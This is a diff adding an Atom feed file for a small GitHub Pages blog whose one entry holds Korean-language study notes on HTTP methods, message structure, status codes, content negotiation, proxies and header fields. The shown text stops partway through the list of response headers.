@@ -1,0 +1,2763 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title>Rust Toy Project</title>
+  <link href="http://sadang-hobbits.github.io"/>
+  <link type="application/atom+xml" rel="self" href="http://sadang-hobbits.github.io/atom.xml"/>
+  <updated>2015-09-03T09:26:05+00:00</updated>
+  <id>http://sadang-hobbits.github.io</id>
+  <author>
+    <name>Rust Toy Project</name>
+    <email>lvev9925@naver.com</email>
+  </author>
+
+  
+      
+      <entry>
+        <id>http://spoqa.github.com/2015/09/03/네트워크</id>
+        <link type="text/html" rel="alternate" href="http://sadang-hobbits.github.io/2015/09/03/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC.html"/>
+        <title>Network</title>
+        <updated>2015-09-03T00:00:00+00:00</updated>
+        <author>
+          <name>Yoonsung</name>
+          <uri>http://sadang-hobbits.github.io/2015/09/03/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC.html</uri>
+        </author>
+        <content type="html">&lt;h2 id=&quot;section&quot;&gt;&lt;em&gt;네트워크 학습공간&lt;/em&gt;&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;최신업데이트 일자  : 2015. 09. 03
+&lt;br /&gt;
+추가할 내용 : RFC 문서내용, 데이터통신과 컴퓨터 네트워크 및 기타 도서&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;section-1&quot;&gt;용어정리&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Message Body와 Entity Body의 차이
+    &lt;ul&gt;
+      &lt;li&gt;messsage : HTTP 통신의 기본 단위로 옥텟 시퀀스(Octet sequence, octet은 8비트)로 구성되고 통신을 통해서 전송된다&lt;/li&gt;
+      &lt;li&gt;entity : Request와 Response의 Payload로 전송되는 정보로 entity-header(header정보의) 와 entity-body로 구성된다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;http-method&quot;&gt;HTTP Method&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;GET : 리소스 획득&lt;/li&gt;
+  &lt;li&gt;POST : 엔티티 전송&lt;/li&gt;
+  &lt;li&gt;PUT : 파일전송 &lt;/li&gt;
+  &lt;li&gt;HEAD : 메세지 헤더 취득&lt;/li&gt;
+  &lt;li&gt;DELETE : 파일삭제&lt;/li&gt;
+  &lt;li&gt;OPTION : 제공하고 있는 메서드 문의&lt;/li&gt;
+  &lt;li&gt;TRACE : 경로조사&lt;/li&gt;
+  &lt;li&gt;CONNECT : 프록시에 터널링 요청&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;http-message-&quot;&gt;HTTP Message 구조&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Request (&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html&quot;&gt;RFC2616-SEC5&lt;/a&gt;)
+    &lt;ul&gt;
+      &lt;li&gt;Message Header
+        &lt;ul&gt;
+          &lt;li&gt;request-line&lt;/li&gt;
+          &lt;li&gt;general-header&lt;/li&gt;
+          &lt;li&gt;request-header&lt;/li&gt;
+          &lt;li&gt;entity-header&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;CRLF (new line)&lt;/li&gt;
+      &lt;li&gt;Message Body&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Response (&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec6.html&quot;&gt;RFC2616-SEC6&lt;/a&gt;)
+    &lt;ul&gt;
+      &lt;li&gt;Message Header
+        &lt;ul&gt;
+          &lt;li&gt;status-line&lt;/li&gt;
+          &lt;li&gt;general-header&lt;/li&gt;
+          &lt;li&gt;request-header&lt;/li&gt;
+          &lt;li&gt;entity-header&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;CRLF (new line)&lt;/li&gt;
+      &lt;li&gt;Message Body&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;http-&quot;&gt;HTTP의 효율관리&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Content Coding
+    &lt;ul&gt;
+      &lt;li&gt;엔티티에 적용하는 인코딩을 가리킨다. 엔티티 정보를 유지한채로 압축&lt;/li&gt;
+      &lt;li&gt;수신한 클라이언트 측에서 디코딩한다&lt;/li&gt;
+      &lt;li&gt;인코딩을 하면 다량의 액세스를 효율 좋게 처리할 수 있다. 단지 컴퓨터에서 인코딩 처리를 해야 하기 때문에 CPU등의 리소스는 보다 많이 소비하게 된다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Chunk Transfer Coding
+    &lt;ul&gt;
+      &lt;li&gt;HTTP 통신에서는 요청했던 리소스 전부에 엔티티 바디의 전송이 완료되지 않으면 브라우저에 표시되지 않는다.&lt;/li&gt;
+      &lt;li&gt;사이즈가 큰 데이터를 전송하는 경우에 데이터를 분할해서 조금씩 표시할 수 있다&lt;/li&gt;
+      &lt;li&gt;이렇게 엔티티 바디를 분할하는 기능을 청크 전송 코딩이라고 부른다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;multipart&quot;&gt;Multipart&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;사전지식
+    &lt;ul&gt;
+      &lt;li&gt;메일의 경우, 본문이나 복수의 첨부 파일을 붙여서 함께 보낼 수 있다&lt;/li&gt;
+      &lt;li&gt;이것은 MIME으로 불리는 메일로 텍스트나 영상, 이미지와 같은 여러다른 데이터를 다루기 위한 기능을 사용하고 있는 것이다.
+        &lt;ul&gt;
+          &lt;li&gt;MIME; Multipurpose Internet Mail Extensions&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;MIME은 1)이미지 등의 바이너리 데이터를 아스키 문자열에 인코딩하는 방법과 2)데이터 종류를 나타내는 방법 등을 규정하고 있다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;HTTP도 Multipart에 대응하고 있어 하나의 메시지 바디 내부에 엔티티를 여러개 포함시켜 보낼 수 있다&lt;/li&gt;
+  &lt;li&gt;주로 이미지나 텍스트 파일 등을 업로드할 때 사용되고 있다&lt;/li&gt;
+  &lt;li&gt;멀티파트의 종류 (둘다 boundary를 지정해서 Content를 구분해야 한다)
+    &lt;ul&gt;
+      &lt;li&gt;multipart/form-data : Web form으로부터 파일 업로드에 사용&lt;/li&gt;
+      &lt;li&gt;multipart/byteranges : 상태코드 206(Partial Content) 리스폰스 메시지가 복수 범위의 내용을 포함하는 때 사용&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;application/x-www-form-urlencoded와 multipart/form-data의 차이 (&lt;a href=&quot;http://stackoverflow.com/questions/4007969/application-x-www-form-urlencoded-or-multipart-form-data&quot;&gt;stackoverflow&lt;/a&gt;)
+    &lt;ul&gt;
+      &lt;li&gt;전자는 하나의 쿼리스트링으로 데이터를 변환해서 전송한다. 데이터가 늘어날 수 있다&lt;/li&gt;
+      &lt;li&gt;후자는 각각의 데이터타입을 Content-Disposition항목을 통해 나타내므로 효율이 좋다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;rfc-2616-sec10httpwwww3orgprotocolsrfc2616rfc2616-sec10html&quot;&gt;상태코드의 의미 (&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html&quot;&gt;RFC-2616-SEC10&lt;/a&gt;)&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;첫번째 자리는 Response의 클래스를 의미, 나머지 2자리는 분류가 없다&lt;/li&gt;
+  &lt;li&gt;Infomational
+    &lt;ul&gt;
+      &lt;li&gt;1XX = Request를 처리중이다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Success
+    &lt;ul&gt;
+      &lt;li&gt;2XX = Request를 정상적으로 처리했다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Redirection
+    &lt;ul&gt;
+      &lt;li&gt;3XX = Request를 완료하기 위해서 추가동작이 필요하다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Client Error
+    &lt;ul&gt;
+      &lt;li&gt;4XX = Request를 서버에서 이해할 수 없다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Server Error
+    &lt;ul&gt;
+      &lt;li&gt;5XX = Request를 처리하던 중 서버에서 실패하였다&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-2&quot;&gt;대표적 상태코드 및 사용한 경험이 있는 종류&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2XX
+    &lt;ul&gt;
+      &lt;li&gt;200 OK
+        &lt;ul&gt;
+          &lt;li&gt;Request를 정상적으로 처리&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;201 Created
+        &lt;ul&gt;
+          &lt;li&gt;Request를 통해 새로운 Resource를 생성&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;204 No Content
+        &lt;ul&gt;
+          &lt;li&gt;Request를 통해 처리를 성공했지만 되돌려줄 리소스가 없다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;206 Partial Content
+        &lt;ul&gt;
+          &lt;li&gt;Range에 의해 서버에서는 지정된 범위의 GET Request를 받았음을 나타낸다&lt;/li&gt;
+          &lt;li&gt;Response에는 Content-Range로 지정된 범위의 엔티티가 포함된다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;3XX
+    &lt;ul&gt;
+      &lt;li&gt;301 Moved Permanently
+        &lt;ul&gt;
+          &lt;li&gt;Request된 Resource에 새로운 URI가 부여되어 있기 때문에, 그 리소스를 참조하는 URI를 사용해야 한다는 것을 나타낸다&lt;/li&gt;
+          &lt;li&gt;북마크예시 : Resource URI가 변경되었으니, 변경해라&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;302 Found
+        &lt;ul&gt;
+          &lt;li&gt;Request된 Resource에는 새로운 URI가 할당되어 있기 때문에 그 URI를 참조해 주길 바란다는 의미를 나타내고 있다&lt;/li&gt;
+          &lt;li&gt;301과 비슷하지만 302는 영구적인 이동이 아닌 일시적인 것이다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;303 See Other
+        &lt;ul&gt;
+          &lt;li&gt;Request에 대한 리소스는 다른 URI에 있기 때문에 GET메소드를 사용해서 얻어야 한다는 것을 나타내고 있다.&lt;/li&gt;
+          &lt;li&gt;이것은 302와 같은 기능이지만, 리다이렉트 장소를 GET 메소드로 얻어야 한다고 명확하게 되어 있는 점이 302와 다르다&lt;/li&gt;
+          &lt;li&gt;예를들면 POST 메소드로 액세스한 CGI 프로그램을 실행한 후에 처리 결과를 별도의 URI에 GET 메소드로 리다이렉트 시키고 싶은 경우 등에 303이 사용되고 있다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;304 Not Modified
+        &lt;ul&gt;
+          &lt;li&gt;Client가 조건부 Request를 했을때 리소스에 대한 액세스는 허락하지만, 조건이 충족되지 않음을 표시한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;307 Temporary Redirect
+        &lt;ul&gt;
+          &lt;li&gt;302 Found와 같은 의미를 지니지만, 302의 경우에는 POST로부터 GET으로 치환이 금지되어 있는데도 불구하고 구현상 그와 같이 되어있지는 않다&lt;/li&gt;
+          &lt;li&gt;307에서는 브라우저 사양에 따라 POST에서 GET으로 치환을 하지 않는다&lt;/li&gt;
+          &lt;li&gt;브라우저마다 Response를 처리하는 동작이 다를 경우가 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;4XX
+    &lt;ul&gt;
+      &lt;li&gt;400 Bad Request
+        &lt;ul&gt;
+          &lt;li&gt;클라이언트의 원인으로 에러가 발생했음을 나타낸다&lt;/li&gt;
+          &lt;li&gt;Request 구문이 잘못되었음을 나타낸다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;401 Unauthorized
+        &lt;ul&gt;
+          &lt;li&gt;송신한 Request에 HTTP 인증 (Basic, Digest Authentication) 정보가 필요하다는 것을 나타낸다&lt;/li&gt;
+          &lt;li&gt;401을 포함한 Response를 되돌리는 경우에는 Request된 Resource에 적용되는 challenge를 포함한 WWW-Authenticate 헤더 필드를 포함할 필요가 있다&lt;/li&gt;
+          &lt;li&gt;브라우저에서 처음 401 Response를 받은 경우에는 인증을 위한 Dialog가 표시된다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;403 Forbidden
+        &lt;ul&gt;
+          &lt;li&gt;Request된 Resource의 Access가 거부되었음을 나타내고 있다&lt;/li&gt;
+          &lt;li&gt;서버측은 거부의 이류를 분명히 할 필요가 있는데, 이유를 명확하게 하는 경우에는 엔티티 바디에 기재해서 유저측에 표시한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;404 Not Found
+        &lt;ul&gt;
+          &lt;li&gt;Request한 Resource가 서버상에 없다는 것을 나타낸다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;5XX
+    &lt;ul&gt;
+      &lt;li&gt;500 Internal Server Error
+        &lt;ul&gt;
+          &lt;li&gt;서버에서 리퀘스트를 처리하는 도중에 에러가 발생하였음을 나타낸다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;503 Service Unavailable
+        &lt;ul&gt;
+          &lt;li&gt;일시적으로 서버가 과부하 상태이거나 점검중이기 때문에 현재 Request를 처리할 수 없음을 나타내고 있다&lt;/li&gt;
+          &lt;li&gt;이 상태가 해소되기까지 시간이 걸리는 경우에는 Retry-After 헤더필드에 따라 클라이언트에 전달하는 것이 바람직하다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;content-negotiation&quot;&gt;Content Negotiation&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;클라이언트와 서버가 제공하는 리소스의 내용에 대해서 교섭하는 과정이다&lt;/li&gt;
+  &lt;li&gt;판단주체가 서버 혹은 클라이언트 둘중에 하나가 될 수 있다
+    &lt;ul&gt;
+      &lt;li&gt;Server-driven Negotiation&lt;/li&gt;
+      &lt;li&gt;Agent-driven Negotiation&lt;/li&gt;
+      &lt;li&gt;Transparent Negotiation (hibrid)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;판단기준은 Request Message에 포함된 request-header field이다.
+    &lt;ul&gt;
+      &lt;li&gt;Accept&lt;/li&gt;
+      &lt;li&gt;Accept-Charset&lt;/li&gt;
+      &lt;li&gt;Accept-Encoding&lt;/li&gt;
+      &lt;li&gt;Accept-Language&lt;/li&gt;
+      &lt;li&gt;Content-Language&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;section-3&quot;&gt;통신 중계 프로그램&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;프록시 (&lt;a href=&quot;http://www.w3.org/Library/User/Using/Proxy.html&quot;&gt;w3.org&lt;/a&gt;)
+    &lt;ul&gt;
+      &lt;li&gt;서버와 클라이언트의 양쪽 역할을 하는 중계 프로그램으로, 클라이언트로부터의 리퀘스트를 서버에 전송하고, 서버로부터의 리스폰스를 클라이언트에 전송한다&lt;/li&gt;
+      &lt;li&gt;사용분류
+        &lt;ul&gt;
+          &lt;li&gt;Cashing Proxy
+            &lt;ul&gt;
+              &lt;li&gt;프록시로 리스폰스를 중계하는 때에는 프록시 서버 상에 리소스 캐시를 보존해 두는 타입의 프록시&lt;/li&gt;
+              &lt;li&gt;같은 리소스에 리퀘스트가 온 경우, 오리진 서버로부터 리소스를 획득하는 것이 아니라 캐시를 리스폰스로서 되돌려주는 것이 있다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;Transparent Proxy : 메세지를 변경하는지
+            &lt;ul&gt;
+              &lt;li&gt;프록시로 리퀘스트와 리스폰스를 중계할 때 메세지 변경을 하지 않는 타입의 프록시&lt;/li&gt;
+              &lt;li&gt;반대로 메세지에 변경을 가하는 타입의 프록시를 비투과 프록시라고 한다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;게이트웨이
+    &lt;ul&gt;
+      &lt;li&gt;다른 서버를 중계하는 서버로, 클라이언트로부터 수신한 리퀘스트를 리소스를 보유한 서버인 것처럼 수신한다. &lt;/li&gt;
+      &lt;li&gt;클라이언트에서 게이트웨이를 지나 HTTP서버 이외의 서비스를 제공하는 서버가 된다. 즉 다른 프로토콜을 연결  &lt;/li&gt;
+      &lt;li&gt;역할
+        &lt;ul&gt;
+          &lt;li&gt;클라이언트와 게이트웨이 사이를 암호화하는 등으로 안전하게 접속함으로서 통신의 안전성을 높이는 역할&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;터널
+    &lt;ul&gt;
+      &lt;li&gt;서로 떨어진 두대의 클라이언트와 서버 사이를 중계하며 접속을 주선하는 중계 프로그램&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;http-header-field&quot;&gt;HTTP Header Field&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;HTTP 메시지를 구성하는 요소의 하나&lt;/li&gt;
+  &lt;li&gt;메세지 바디의 크기를 사용하고 있는 언어, 인증 정보 등을 브라우저나 서버에 제공하기 위해 사용되고 있다&lt;/li&gt;
+  &lt;li&gt;구조
+    &lt;ul&gt;
+      &lt;li&gt;헤더필드 명 : 필드 값&lt;/li&gt;
+      &lt;li&gt;ex) Content-Type : text/html&lt;/li&gt;
+      &lt;li&gt;ex) Keep-Alive: timeout=15, max=100 (이렇게 복수개 선언 가능)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;HTTP Header Field 종류
+    &lt;ul&gt;
+      &lt;li&gt;General Header Field
+        &lt;ul&gt;
+          &lt;li&gt;request, response에 모두 사용되는 필드&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Request Header Field
+        &lt;ul&gt;
+          &lt;li&gt;클라이언트에서 서브로 송신된 request message에 사용되는 헤더&lt;/li&gt;
+          &lt;li&gt;request의 부가적 정보와 클라이언트의 정보, 리스폰스의 콘텐츠에 관한 우선 순위등을 부가한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Response Header Field
+        &lt;ul&gt;
+          &lt;li&gt;서버 측에서 클라이언트 측으로 송신한 리스폰스 메시지에 사용되는 헤더&lt;/li&gt;
+          &lt;li&gt;response의 정보와 서버의 정보, 클라이엉ㄴ트의 추가 정보 요구 등을 부가한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Entity Header Field
+        &lt;ul&gt;
+          &lt;li&gt;request message와 response message에 포함된 entity에 사용되는 헤더로 콘텐츠 갱신 시간 등의 엔티티에 관한 정보를 부가한다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;헤더필드
+    &lt;ul&gt;
+      &lt;li&gt;HTTP/1.1에 정의된 헤더 필드에는 47종류가 있다&lt;/li&gt;
+      &lt;li&gt;HTTP/1.1 이외에 헤더 필드 외에 RFC에 정의되어 폭넓게 사용되고 있는것도 있다
+        &lt;ul&gt;
+          &lt;li&gt;이러한 비표준 헤더 필드는 &lt;a href=&quot;http://www.rfc-base.org/rfc-4229.html&quot;&gt;RFC4229 HTTP Header Field Registrations&lt;/a&gt;에 정리되어 있다&lt;/li&gt;
+          &lt;li&gt;종류로는 Set-Cookie, Content-Disposition 등이 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;General Header Field
+    &lt;ul&gt;
+      &lt;li&gt;Cache-Control : 캐시동작 지정&lt;/li&gt;
+      &lt;li&gt;Connection : 홉바이 홉 헤더, 커넥션 관리
+        &lt;ul&gt;
+          &lt;li&gt;프록시에 더 이상 전송하지 않는 헤더 필드를 지정
+            &lt;ul&gt;
+              &lt;li&gt;&lt;code&gt;GET / HTTP/1.1&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;Upgrade: HTTP/1.1&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;code&gt;Connection: Upgrade&lt;/code&gt;&lt;/li&gt;
+              &lt;li&gt;프록시 서버에서 Upgrade와 Connection 필드를 삭제한다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;지속적 접속 관리
+            &lt;ul&gt;
+              &lt;li&gt;HTTP 1.1에서는 지속적 접속이 디폴트로 되어 있다 (Connection: Keep-Alive)&lt;/li&gt;
+              &lt;li&gt;서버에서 명시적으로 접속을 끊고 싶을 경우 (Connection: Close)&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Date : 메세지 생성 날짜&lt;/li&gt;
+      &lt;li&gt;Pragma : 메세지 제어
+      - HTTP/1.1보다 오래된 버전의 흔적으로 HTTP/1.0와의 후방 호환성만을 위해서 정의되어 있는 헤더 필드이다
+      - 지정할 수 있는 형식은 1개 뿐이다 (Pragma: no-cache)&lt;/li&gt;
+      &lt;li&gt;Trailer : 메세지 끝에 있는 헤더의 일람
+      - 예를들어 Trailer : Expires 라고하면 바디 맨 마지막에  &lt;code&gt;Expires: Tue, 20 ~~&lt;/code&gt; 이런식으로 선언되어 있다&lt;/li&gt;
+      &lt;li&gt;Transfer-Encoding : 메세지 바다의 전송 코딩형식 지정
+      - HTTP/1.1에서 전송코딩 형식으로 청크 전송만이 정의되어 있다 (Transfer-Encoding: chunked)&lt;/li&gt;
+      &lt;li&gt;Upgrade : 다른 프로토콜로 업그레이드 요청 (“이 프로토콜을 사용하게 해주지 않을래?”)&lt;/li&gt;
+      &lt;li&gt;Via : 프록시 서버에 관한 정보 (경유하는 프록시 정보들을 순차적으로 추가한다)&lt;/li&gt;
+      &lt;li&gt;Warning : 에러 통지&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Request Header Field
+    &lt;ul&gt;
+      &lt;li&gt;Accept : 유저 에이전트가 처리 가능한 미디어 타입, 선언순서는 우선순위가 된다
+        &lt;ul&gt;
+          &lt;li&gt;텍스트 파일 : text/html, text/plain, text/css …, application/xhtml+xml, application/xml …&lt;/li&gt;
+          &lt;li&gt;이미지 파일 : image/jpeg, image/gif, image/png …&lt;/li&gt;
+          &lt;li&gt;동영상 파일 : video/mpeg, video/quicktime…&lt;/li&gt;
+          &lt;li&gt;애플리케이션용 바이너리 : application/octet-stream, application/zip …&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Accept-Charset : agent에서 처리할 수 있는 문자셋, (문자셋 우선 순위별로 선언)&lt;/li&gt;
+      &lt;li&gt;Accept-Encoding : agent에서 처리할 수 있는 콘텐츠 코딩과 상대적 우선순위를 지정
+        &lt;ul&gt;
+          &lt;li&gt;ex) Accept-Encoding : gzip, deflate&lt;/li&gt;
+          &lt;li&gt;gzip : 파일 압축 프로그램 gzip(GNU zip)에서 생성된 인코딩 포맷으로 32비트 CRC를 사용한다&lt;/li&gt;
+          &lt;li&gt;compress : UNIX 파일 압축 프로그램 “compress”에 의해서 만들어진 인코딩 포맷&lt;/li&gt;
+          &lt;li&gt;deflate : deflate 압축 알고리즘에 의해서 만들어진 인코딩 포맷을 조합&lt;/li&gt;
+          &lt;li&gt;identity : 압축과 변형을 하지 않는 디폴트 인코딩 포맷&lt;/li&gt;
+          &lt;li&gt;
+            &lt;ul&gt;
+              &lt;li&gt;: asterisk를 지정하면 와일드 카드로서 모든 인코딩 포맷을 가리킨다&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Accept-Language : 언어 우선순위&lt;/li&gt;
+      &lt;li&gt;Authorization : agent의 인증정보를 전달하기 위해서 사용된다.&lt;/li&gt;
+      &lt;li&gt;Expect : 서버에 대한 특정 동작의 기대&lt;/li&gt;
+      &lt;li&gt;From : 유저의 메일 주소&lt;/li&gt;
+      &lt;li&gt;Host : request한 resource의 인터넷 호스트와 포트번호를 전달한다.
+        &lt;ul&gt;
+          &lt;li&gt;HTTP/1.1에서 유일한 필수 헤더 필드이다&lt;/li&gt;
+          &lt;li&gt;1대의 서버에서 복수의 도메인을 할당할 수 있는 가상 호스트의 구조와 매우 깊은 관련이 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;if-xxx
+        &lt;ul&gt;
+          &lt;li&gt;조건부 리퀘스트라고 부른다&lt;/li&gt;
+          &lt;li&gt;조건부 리퀘스트를 받은 서버는 조건에 맞는 경우에만 리퀘스트를 받는다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;If-Match : 엔티티 태그의 비교
+        &lt;ul&gt;
+          &lt;li&gt;서버상의 리소스를 특정하기 위해서 엔티티 태그(ETag) 값을 전달한다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;If-Modified-Since : 리소스의 갱신 시간 비교&lt;/li&gt;
+      &lt;li&gt;If-None-Match : 엔티티 태그의 비교(If-Match의 반대)&lt;/li&gt;
+      &lt;li&gt;If-Range : 리소스가 갱신되지 않은 경우에 엔티티의 바이트 범위의 요구를 송신&lt;/li&gt;
+      &lt;li&gt;If-Unmodified-Since : 리소스가 갱신되지 않은 경우에 엔티티의 바이트 범위의 요구를 송신&lt;/li&gt;
+      &lt;li&gt;Max-Forwards : 최대 전송 홉 수&lt;/li&gt;
+      &lt;li&gt;Proxy-Authorization : 프록시 서버의 클라이언트 인증을 위한 정보&lt;/li&gt;
+      &lt;li&gt;Range : 엔티티 바이트 범위 요구&lt;/li&gt;
+      &lt;li&gt;Referer : request 중의 URI를 취득하는 곳
+        &lt;ul&gt;
+          &lt;li&gt;기본적으로 Referer 헤더 필드는 보내져야 하지만, 브라우저의 주소창에 직접 URI를 입력한 경우와 보안상 바람직하지 않다고 판단된 경우에는 보내지 않아도 괜찮다.&lt;/li&gt;
+          &lt;li&gt;철자는 Referrer가 올바르지만, 잘못된 철자 그대로 사용되고 있다&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;TE : 전송 인코딩의 우선순위&lt;/li&gt;
+      &lt;li&gt;User-Agent : HTTP 클라이언트의 정보
+        &lt;ul&gt;
+          &lt;li&gt;로봇엔진의 request 의 경우에는 로봇 엔진의 책임자 메일 주소가 부가된 것도 있다.&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Response Header Field
+    &lt;ul&gt;
+      &lt;li&gt;Accept-Ranges : 바이트 단위의 요구를 수신할 수 있는지 없는지 여부&lt;/li&gt;
+      &lt;li&gt;Age : 얼마나 오래 전에 오리진 서버에서 리스폰스가 생성되었는지를 전달한다.
